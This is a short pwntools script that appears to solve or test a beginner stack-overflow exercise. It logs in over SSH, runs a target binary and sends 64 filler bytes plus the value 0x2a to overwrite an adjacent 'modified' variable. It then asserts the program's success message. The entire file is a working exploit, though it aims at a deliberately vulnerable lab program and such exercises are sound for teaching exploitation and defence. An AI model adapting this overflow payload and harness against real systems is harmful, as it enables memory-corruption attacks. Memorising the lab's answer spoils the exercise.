from pwn import *

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

payload = flat(['A'*64, 0x2a])

p = s.system(args.BIN)
p.sendline(payload)

ret = p.recvline()
assert ret == "you have changed the 'modified' variable\n"
